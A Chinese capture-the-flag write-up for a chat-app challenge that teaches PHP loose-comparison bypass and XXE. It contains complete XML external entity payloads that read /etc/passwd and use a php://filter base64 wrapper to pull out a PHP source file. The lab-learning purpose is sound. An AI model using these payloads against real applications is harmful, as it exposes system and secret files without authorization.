# 性感黄阿姨在线聊天
## 考察知识点：
### 1.php弱类型
### 2.json引申xxe漏洞攻击

## 解题思路
### 1. 随便发送数据测试，发送flag时，感觉有蹊跷，抓包查看一下
![image](images/DED9E2F31CF14A28B9433C44483C9A02性感黄阿姨在线聊天1.png)

### 2. 将数据包中的guest,改为admin
![image](images/B2D6627901254D8C987FD7DCD9988A9B性感黄阿姨在线聊天2.png)
发现提示：`{"response":"admin\u4e5f\u4e0d\u884c! \/\/if($name==md5($flag)){flag in ...}"}`

如果发送的name\==md5(flag)则告诉我们flag的位置，此处我们只能考虑php的弱类型，刚好也有个==

大致思路:就是爆破name，只要md5(flag)的前几位为数字，爆破name，就能绕过限制，没看wp真没想出来

当name=357时，返回flag文件。那下一步思路就是进行文件读取。
![image](images/DE10EBFE5B804F7DAF0F1833544C0C20性感黄阿姨在线聊天3.png)

一些弱类型的小测试：

![image](images/06909289FCBA4209B8C2A57836605D00性感黄阿姨在线聊天4.png)

### 3.文件读取有几个思路
#### 3.1 命令执行，代码执行
#### 3.2 文件包含伪协议
#### 3.3 xxe
#### 3.4 ....
### 4.此处发送的数据包为json数据，由json可以联想到xml数据是否也能解析

![image](images/D7C2785A2B02433D807D08A9319071B8性感黄阿姨在线聊天5.png)
看来是解析了，此处没有返回flag文件的路径是因为xml文件的字段为字符串，'357'与'375abc'不相等。

### 5.构造xxe
payload:
```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE xxe[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
   <root>
     <name>&xxe;</name>
     <request>flag</request>
   </root>
```

![image](images/D1045268E66B40609192FE590D8D8B5C性感黄阿姨在线聊天6.png)

直接读取f14g_Is_Here.php文件读取不出来，因为php文件中含有<特殊符号，xml解析时报错了

这里可以采用伪协议：

payload：
```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE xxe[
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./_f14g_Is_Here_.php">
]>
   <root>
     <name>&xxe;</name>
     <request>flag</request>
   </root>
```
![image](images/0F0A6CE15A854F37A2D48B47FF6FE5A0性感黄阿姨在线聊天7.png)

### 6.解码得到flag
![image](images/B799E679E2C942E988E65C9F472ED18E性感黄阿姨在线聊天8.png)